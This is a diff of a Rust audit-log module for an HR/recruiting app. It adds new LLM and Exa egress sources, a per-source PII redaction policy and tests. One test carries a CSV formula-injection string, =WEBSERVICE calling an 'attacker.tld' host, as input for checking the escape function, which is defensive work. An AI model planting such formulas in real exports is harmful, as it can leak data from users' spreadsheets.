@@ -2,7 +2,7 @@
 // Records all LLM egress for compliance tracking
 //
 // Key responsibilities:
-// 1. Record one row per LLM egress attempt (`record_llm_egress`), written
+// 1. Record one row per LLM egress attempt (`record_egress`), written
 //    backend-side at the chat seam (#112) — interactive chat, memory
 //    summaries, review highlights, title generation, recruiting intake —
 //    including partial rows for errored/cancelled streams
@@ -99,10 +99,18 @@ pub enum EgressSource {
     HighlightSummary,
     /// Conversation title generation.
     TitleGeneration,
-    /// Recruiting intake LLM calls (company/profile analysis, seed
-    /// extraction). These share the chat seam, so they audit here; the full
-    /// recruiting choke point (incl. Exa egress) is FHR-91.
+    /// Recruiting intake LLM calls (company/profile analysis, seed extraction).
     RecruitingIntake,
+    /// Recruiting scoring LLM calls (signal extraction, narrative generation).
+    RecruitingScoring,
+    /// Exa `/search` — candidate discovery queries (FHR-91).
+    ExaSearch,
+    /// Exa `/contents` — page-text enrichment for discovered candidates.
+    ExaContents,
+    /// Exa `/findSimilar` — seed-URL snowball discovery.
+    ExaFindSimilar,
+    /// People Map prep-brief generation (FHR-108).
+    PrepBrief,
 }
 
 impl EgressSource {
@@ -114,6 +122,37 @@ impl EgressSource {
             EgressSource::HighlightSummary => "highlight_summary",
             EgressSource::TitleGeneration => "title_generation",
             EgressSource::RecruitingIntake => "recruiting_intake",
+            EgressSource::RecruitingScoring => "recruiting_scoring",
+            EgressSource::ExaSearch => "exa_search",
+            EgressSource::ExaContents => "exa_contents",
+            EgressSource::ExaFindSimilar => "exa_find_similar",
+            EgressSource::PrepBrief => "prep_brief",
+        }
+    }
+
+    /// Which PII detector set applies to this source's request text (FHR-90).
+    ///
+    /// For LLM sources this runs *before* the send — the provider never sees
+    /// the raw text. For Exa sources the query must go out verbatim (the
+    /// candidate's name is the query), so the policy governs only what is
+    /// written into the audit row. Both cases want the same detector set for
+    /// recruiting, hence one method.
+    ///
+    /// Matched exhaustively on purpose: a new source must choose a policy
+    /// rather than silently inherit the weaker one.
+    pub fn redaction_policy(&self) -> crate::pii::RedactionPolicy {
+        match self {
+            EgressSource::RecruitingIntake
+            | EgressSource::RecruitingScoring
+            | EgressSource::ExaSearch
+            | EgressSource::ExaContents
+            | EgressSource::ExaFindSimilar => crate::pii::RedactionPolicy::CandidateEgress,
+            EgressSource::Interactive
+            | EgressSource::MemorySummary
+            | EgressSource::HighlightExtraction
+            | EgressSource::HighlightSummary
+            | EgressSource::TitleGeneration
+            | EgressSource::PrepBrief => crate::pii::RedactionPolicy::Standard,
         }
     }
 }
@@ -144,12 +183,13 @@ pub struct EgressAudit {
 /// row keeps a prefix sufficient to classify the failure.
 const EGRESS_ERROR_PREVIEW_CHARS: usize = 200;
 
-/// Record one LLM egress attempt in the audit log.
+/// Record one egress attempt in the audit log.
 ///
-/// The single backend write path for #112: called by the chat seam after
-/// every attempt — success, provider/stream error, or user cancel. Failures
-/// here must never block the chat flow; callers log-and-continue.
-pub async fn record_llm_egress(
+/// The single backend write path (#112, extended by FHR-91): called by the
+/// chat seam after every LLM attempt — success, provider/stream error, or
+/// user cancel — and by the Exa adapter for every data-API request. Failures
+/// here must never block the calling flow; callers log-and-continue.
+pub async fn record_egress(
     pool: &DbPool,
     ctx: &EgressAudit,
     request_redacted: &str,
@@ -162,7 +202,10 @@ pub async fn record_llm_egress(
             "ok",
             format!("[REDACTED_RESPONSE length={response_chars} chars]"),
         ),
-        EgressOutcome::Error { partial_chars, error } => (
+        EgressOutcome::Error {
+            partial_chars,
+            error,
+        } => (
             "error",
             format!(
                 "[STREAM_ERROR after {partial_chars} chars: {}]",
@@ -236,7 +279,7 @@ pub struct ExportResult {
 // ============================================================================
 
 // #112: `create_audit_entry` (the frontend-facing write) was removed —
-// `record_llm_egress` above is the single write path, called from the chat
+// `record_egress` above is the single write path, called from the chat
 // seam. The frontend keeps read-only access.
 
 /// Get an audit entry by ID
@@ -466,7 +509,10 @@ pub async fn export_to_csv(
         ));
     }
 
-    Ok(ExportResult { csv_content: csv, row_count })
+    Ok(ExportResult {
+        csv_content: csv,
+        row_count,
+    })
 }
 
 // ============================================================================
@@ -582,7 +628,10 @@ mod tests {
         // The single-quote prefix forces Excel to render the string literally.
         let attack = "=WEBSERVICE(\"http://attacker.tld\")";
         let out = escape_csv(attack);
-        assert!(out.starts_with('"'), "should be quoted for the embedded quote");
+        assert!(
+            out.starts_with('"'),
+            "should be quoted for the embedded quote"
+        );
         assert!(
             out.contains("'=WEBSERVICE"),
             "leading single quote missing: {out}"
@@ -606,7 +655,10 @@ mod tests {
             "formula prefix missing inside quoted field: {at_with_comma}"
         );
         let cr_attack = escape_csv("\rSUM(1)");
-        assert!(cr_attack.contains("'\r"), "formula prefix missing: {cr_attack:?}");
+        assert!(
+            cr_attack.contains("'\r"),
+            "formula prefix missing: {cr_attack:?}"
+        );
     }
 
     #[test]
@@ -635,7 +687,11 @@ mod tests {
 
     #[test]
     fn test_employee_ids_json_serialization() {
-        let ids = vec!["emp-1".to_string(), "emp-2".to_string(), "emp-3".to_string()];
+        let ids = vec![
+            "emp-1".to_string(),
+            "emp-2".to_string(),
+            "emp-3".to_string(),
+        ];
         let json = serde_json::to_string(&ids).unwrap();
         assert_eq!(json, r#"["emp-1","emp-2","emp-3"]"#);
 
@@ -685,14 +741,14 @@ mod tests {
     }
 
     // ========================================================================
-    // record_llm_egress (issue #112): the single backend write path for LLM
+    // record_egress (issue #112): the single backend write path for LLM
     // egress audit rows. Every chat-seam call records one row per attempt —
     // success, error, or user cancel — so the audit log matches what actually
     // left the machine, not just what streamed back successfully.
     // ========================================================================
 
     #[tokio::test]
-    async fn record_llm_egress_ok_writes_full_row() {
+    async fn record_egress_ok_writes_full_row() {
         let pool = test_pool_with_migrations().await;
         let ctx = EgressAudit {
             source: EgressSource::MemorySummary,
@@ -701,7 +757,7 @@ mod tests {
             query_category: None,
         };
 
-        record_llm_egress(
+        record_egress(
             &pool,
             &ctx,
             "User: what is Sarah's rating?",
@@ -729,7 +785,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn record_llm_egress_error_writes_partial_row() {
+    async fn record_egress_error_writes_partial_row() {
         let pool = test_pool_with_migrations().await;
         let ctx = EgressAudit {
             source: EgressSource::Interactive,
@@ -738,7 +794,7 @@ mod tests {
             query_category: None,
         };
 
-        record_llm_egress(
+        record_egress(
             &pool,
             &ctx,
             "redacted question",
@@ -750,12 +806,11 @@ mod tests {
         .await
         .expect("partial row must write");
 
-        let (source, status, response): (Option<String>, Option<String>, String) = sqlx::query_as(
-            "SELECT source, status, response_text FROM audit_log",
-        )
-        .fetch_one(&pool)
-        .await
-        .unwrap();
+        let (source, status, response): (Option<String>, Option<String>, String) =
+            sqlx::query_as("SELECT source, status, response_text FROM audit_log")
+                .fetch_one(&pool)
+                .await
+                .unwrap();
         assert_eq!(source.as_deref(), Some("interactive"));
         assert_eq!(status.as_deref(), Some("error"));
         assert!(
@@ -769,7 +824,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn record_llm_egress_cancelled_writes_partial_row() {
+    async fn record_egress_cancelled_writes_partial_row() {
         let pool = test_pool_with_migrations().await;
         let ctx = EgressAudit {
             source: EgressSource::Interactive,
@@ -778,7 +833,7 @@ mod tests {
             query_category: None,
         };
 
-        record_llm_egress(
+        record_egress(
             &pool,
             &ctx,
             "redacted question",
@@ -797,7 +852,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn record_llm_egress_truncates_oversized_error_messages() {
+    async fn record_egress_truncates_oversized_error_messages() {
         // Provider error bodies are attacker-adjacent (they echo request
         // fragments) and unbounded; the audit row keeps a bounded prefix.
         let pool = test_pool_with_migrations().await;
@@ -809,11 +864,14 @@ mod tests {
         };
 
         let huge_error = "x".repeat(2000);
-        record_llm_egress(
+        record_egress(
             &pool,
             &ctx,
             "req",
-            &EgressOutcome::Error { partial_chars: 0, error: huge_error },
+            &EgressOutcome::Error {
+                partial_chars: 0,
+                error: huge_error,
+            },
         )
         .await
         .unwrap();
@@ -836,7 +894,10 @@ mod tests {
         // history, so pin them.
         assert_eq!(EgressSource::Interactive.as_str(), "interactive");
         assert_eq!(EgressSource::MemorySummary.as_str(), "memory_summary");
-        assert_eq!(EgressSource::HighlightExtraction.as_str(), "highlight_extraction");
+        assert_eq!(
+            EgressSource::HighlightExtraction.as_str(),
+            "highlight_extraction"
+        );
         assert_eq!(EgressSource::HighlightSummary.as_str(), "highlight_summary");
         assert_eq!(EgressSource::TitleGeneration.as_str(), "title_generation");
         assert_eq!(EgressSource::RecruitingIntake.as_str(), "recruiting_intake");
@@ -950,7 +1011,10 @@ mod tests {
                 .fetch_one(&pool)
                 .await
                 .unwrap();
-        assert_eq!(audit_count, 1, "audit row must survive conversation deletion");
+        assert_eq!(
+            audit_count, 1,
+            "audit row must survive conversation deletion"
+        );
 
         let (conv_id,): (Option<String>,) =
             sqlx::query_as("SELECT conversation_id FROM audit_log WHERE id = 'a1'")
@@ -972,12 +1036,165 @@ mod tests {
         // will break at runtime because the SET NULL / NO ACTION interplay
         // with the append-only trigger is what motivated dropping the FK.
         let pool = test_pool_with_migrations().await;
-        let fks: Vec<(String,)> = sqlx::query_as(
-            "SELECT \"table\" FROM pragma_foreign_key_list('audit_log')",
+        let fks: Vec<(String,)> =
+            sqlx::query_as("SELECT \"table\" FROM pragma_foreign_key_list('audit_log')")
+                .fetch_all(&pool)
+                .await
+                .unwrap();
+        assert!(
+            fks.is_empty(),
+            "audit_log must have no FKs after migration 011, got: {:?}",
+            fks
+        );
+    }
+
+    // ========================================================================
+    // FHR-90: the egress source selects the redaction policy
+    // ========================================================================
+
+    #[test]
+    fn recruiting_sources_use_candidate_egress_policy() {
+        for source in [
+            EgressSource::RecruitingIntake,
+            EgressSource::RecruitingScoring,
+        ] {
+            assert_eq!(
+                source.redaction_policy(),
+                crate::pii::RedactionPolicy::CandidateEgress,
+                "{} must redact candidate emails on egress",
+                source.as_str()
+            );
+        }
+    }
+
+    #[test]
+    fn hr_sources_use_standard_policy() {
+        for source in [
+            EgressSource::Interactive,
+            EgressSource::MemorySummary,
+            EgressSource::HighlightExtraction,
+            EgressSource::HighlightSummary,
+            EgressSource::TitleGeneration,
+        ] {
+            assert_eq!(
+                source.redaction_policy(),
+                crate::pii::RedactionPolicy::Standard,
+                "{} must not change HR chat redaction behavior",
+                source.as_str()
+            );
+        }
+    }
+
+    // ========================================================================
+    // FHR-91: Exa (data-API) egress audits into the same table, under its own
+    // source labels.
+    // ========================================================================
+
+    #[test]
+    fn exa_sources_have_stable_labels() {
+        assert_eq!(EgressSource::ExaSearch.as_str(), "exa_search");
+        assert_eq!(EgressSource::ExaContents.as_str(), "exa_contents");
+        assert_eq!(EgressSource::ExaFindSimilar.as_str(), "exa_find_similar");
+    }
+
+    // ========================================================================
+    // FHR-108: People Map prep-brief generation audits through the same seam.
+    // Standard redaction — the employee's record is the payload (decision 8).
+    // ========================================================================
+
+    #[test]
+    fn prep_brief_source_has_stable_label_and_standard_redaction() {
+        assert_eq!(EgressSource::PrepBrief.as_str(), "prep_brief");
+        assert_eq!(
+            EgressSource::PrepBrief.redaction_policy(),
+            crate::pii::RedactionPolicy::Standard
+        );
+    }
+
+    #[tokio::test]
+    async fn record_egress_prep_brief_round_trips_source() {
+        let pool = test_pool_with_migrations().await;
+        let ctx = EgressAudit {
+            source: EgressSource::PrepBrief,
+            conversation_id: None,
+            employee_ids: vec!["emp-1".into()],
+            query_category: None,
+        };
+        record_egress(
+            &pool,
+            &ctx,
+            "brief prompt (redacted)",
+            &EgressOutcome::Ok { response_chars: 10 },
         )
-        .fetch_all(&pool)
+        .await
+        .expect("record prep_brief egress");
+
+        let (source, context_used): (Option<String>, Option<String>) =
+            sqlx::query_as("SELECT source, context_used FROM audit_log")
+                .fetch_one(&pool)
+                .await
+                .unwrap();
+        assert_eq!(source.as_deref(), Some("prep_brief"));
+        assert_eq!(context_used.as_deref(), Some(r#"["emp-1"]"#));
+    }
+
+    #[tokio::test]
+    async fn record_egress_writes_exa_row() {
+        let pool = test_pool_with_migrations().await;
+        let ctx = EgressAudit {
+            source: EgressSource::ExaSearch,
+            conversation_id: None,
+            employee_ids: vec![],
+            query_category: None,
+        };
+        record_egress(
+            &pool,
+            &ctx,
+            "staff engineer at Acme",
+            &EgressOutcome::Ok { response_chars: 42 },
+        )
+        .await
+        .expect("exa egress row must write");
+
+        let (source, status, request): (String, String, String) = sqlx::query_as(
+            "SELECT source, status, request_redacted FROM audit_log ORDER BY rowid DESC LIMIT 1",
+        )
+        .fetch_one(&pool)
         .await
         .unwrap();
-        assert!(fks.is_empty(), "audit_log must have no FKs after migration 011, got: {:?}", fks);
+
+        assert_eq!(source, "exa_search");
+        assert_eq!(status, "ok");
+        assert_eq!(request, "staff engineer at Acme");
+    }
+
+    #[tokio::test]
+    async fn record_egress_writes_exa_error_row() {
+        let pool = test_pool_with_migrations().await;
+        let ctx = EgressAudit {
+            source: EgressSource::ExaFindSimilar,
+            conversation_id: None,
+            employee_ids: vec![],
+            query_category: None,
+        };
+        record_egress(
+            &pool,
+            &ctx,
+            "https://example.com/in/sarah",
+            &EgressOutcome::Error {
+                partial_chars: 0,
+                error: "rate limited".into(),
+            },
+        )
+        .await
+        .expect("failed exa attempts must still audit — the request left the machine");
+
+        let (source, status): (String, String) =
+            sqlx::query_as("SELECT source, status FROM audit_log ORDER BY rowid DESC LIMIT 1")
+                .fetch_one(&pool)
+                .await
+                .unwrap();
+        assert_eq!(source, "exa_find_similar");
+        assert_eq!(status, "error");
     }
 }
